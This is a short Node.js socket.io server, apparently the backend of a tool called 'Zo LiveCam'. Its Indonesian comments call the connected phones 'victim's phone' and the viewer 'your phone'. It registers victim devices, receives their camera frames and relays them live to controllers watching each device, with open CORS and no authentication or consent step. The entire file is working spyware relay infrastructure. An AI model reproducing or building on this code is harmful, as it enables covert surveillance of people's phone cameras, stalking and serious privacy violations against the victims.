const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 1e7  // 10 MB per frame
});

app.get('/', (req, res) => {
  res.send('Zo LiveCam Socket Server Online 🔥');
});

// Map: deviceId -> socketId (client)
const clients = new Map();
// Map: deviceId -> Set of controller socketIds
const controllers = new Map();

io.on('connection', (socket) => {
  console.log('[+] connect:', socket.id);

  // ============ CLIENT (HP KORBAN) ============
  socket.on('client-register', (data) => {
    clients.set(data.id, socket.id);
    socket.deviceId = data.id;
    socket.role = 'client';
    console.log('[client] register:', data.id, data.model);
    io.emit('client-list', Array.from(clients.keys()));
  });

  // Client kirim frame
  socket.on('frame', (data) => {
    // Teruskan ke semua controller yang lagi nonton device ini
    const watchers = controllers.get(socket.deviceId);
    if (watchers) {
      for (const ctrlId of watchers) {
        io.to(ctrlId).emit('frame', data);
      }
    }
  });

  // ============ CONTROLLER (HP LU) ============
  socket.on('controller-watch', (data) => {
    socket.role = 'controller';
    const deviceId = data.targetId;

    if (!controllers.has(deviceId)) {
      controllers.set(deviceId, new Set());
    }
    controllers.get(deviceId).add(socket.id);

    socket.watching = deviceId;
    console.log('[controller]', socket.id, 'watch', deviceId);
  });

  socket.on('controller-unwatch', () => {
    if (socket.watching) {
      const set = controllers.get(socket.watching);
      if (set) set.delete(socket.id);
      socket.watching = null;
    }
  });

  // ============ DISCONNECT ============
  socket.on('disconnect', () => {
    if (socket.role === 'client' && socket.deviceId) {
      clients.delete(socket.deviceId);
      io.emit('client-list', Array.from(clients.keys()));
      console.log('[-] client offline:', socket.deviceId);
    } else if (socket.role === 'controller') {
      if (socket.watching) {
        const set = controllers.get(socket.watching);
        if (set) set.delete(socket.id);
      }
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('🔥 Socket server jalan di port ' + PORT));
